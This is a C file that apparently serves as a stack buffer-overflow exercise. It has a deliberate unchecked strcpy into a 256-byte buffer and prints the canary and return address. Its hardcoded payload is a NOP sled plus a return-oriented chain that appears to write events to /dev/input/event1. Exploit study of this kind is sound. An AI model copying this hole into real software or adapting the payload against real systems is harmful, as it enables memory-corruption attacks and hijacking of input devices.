#include <stdio.h>

#define A 0x41

const char default_shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x60\xc1\xf0\xb7\x2f\x64\x65\x76\x24\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x2f\x69\x6e\x70\x28\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x75\x74\x2f\x65\x2c\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x76\x65\x6e\x74\x30\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x31\x61\x61\x61\x34\xa0\x04\x08\x9f\x50\xe4\xb7\xae\xb2\xe8\xb7\x24\xa0\x04\x08\x64\xb9\xe4\xb7\xbb\x58\xe4\xb7\x01\x01\x01\x01\x35\xa0\x04\x08\x34\x50\xea\xb7\x67\xaf\xe9\xb7\xbb\x58\xe4\xb7\x02\x02\x02\x02\x39\xa0\x04\x08\xf0\xe1\xf2\xb7\x34\x50\xea\xb7\x2c\xaf\xf5\xb7\x24\xa0\x04\x08\x67\xaf\xe9\xb7\x10\x4a\xf6\xb7\x75\x1a\xed\xb7\x39\x93\xf3\xb7\x72\x65\xef\xb7\x60\xc1\xf0\xb7\x01\x00\x1e\x00\x44\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x01\x00\x00\x00\x48\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x3c\xa0\x04\x08\x01\x01\x01\x01\x64\xb9\xe4\xb7\x38\xc2\xe9\xb7\x01\x01\x01\x01\x01\x01\x01\x01\x39\x93\xf3\xb7\x10\x0a\xec\xb7\x75\x1a\xed\xb7\x60\xc1\xf0\xb7\x00\x00\x00\x00\x48\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x3c\xa0\x04\x08\x01\x01\x01\x01\x64\xb9\xe4\xb7\x38\xc2\xe9\xb7\x01\x01\x01\x01\x01\x01\x01\x01\x39\x93\xf3\xb7\x10\x0a\xec\xb7\x75\x1a\xed\xb7\x60\xc1\xf0\xb7\x01\x00\x30\x00\x44\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x01\x00\x00\x00\x48\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x3c\xa0\x04\x08\x01\x01\x01\x01\x64\xb9\xe4\xb7\x38\xc2\xe9\xb7\x01\x01\x01\x01\x01\x01\x01\x01\x39\x93\xf3\xb7\x10\x0a\xec\xb7\x75\x1a\xed\xb7\x60\xc1\xf0\xb7\x00\x00\x00\x00\x48\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x3c\xa0\x04\x08\x01\x01\x01\x01\x64\xb9\xe4\xb7\x38\xc2\xe9\xb7\x01\x01\x01\x01\x01\x01\x01\x01\x39\x93\xf3\xb7\x10\x0a\xec\xb7\x75\x1a\xed\xb7";

long *return_addr, *canary_h, *canary_l;

int main(int argc, char *argv[]) {

    char buffer[256];
    // the extra 8 is the canary bytes
    return_addr = buffer + 256 + 8 + 4;
    canary_h = buffer + 256;
    canary_l = buffer + 256 + 4;
    memset(buffer, A, sizeof(buffer));
    // To check if shellcode is broken
    printf("\nargc: %d\n\n", argc);
    printf("Contents of return address before buffer overflow: %010p\n\n", *return_addr);
    printf("Canary bytes: %010p %010p\n\n", *canary_h, *canary_l);
    printf("Buffer address: %010p\n\n", buffer);
    printf("Return address: %010p\n\n", return_addr);
    if (argc > 1) {
        strcpy(buffer, argv[1]);
    } else {
        memcpy(buffer, default_shellcode, sizeof(default_shellcode)/sizeof(char));
    }   
    printf("Contents of return address after buffer overflow: %010p\n\n", *return_addr);
        
    return 0;
}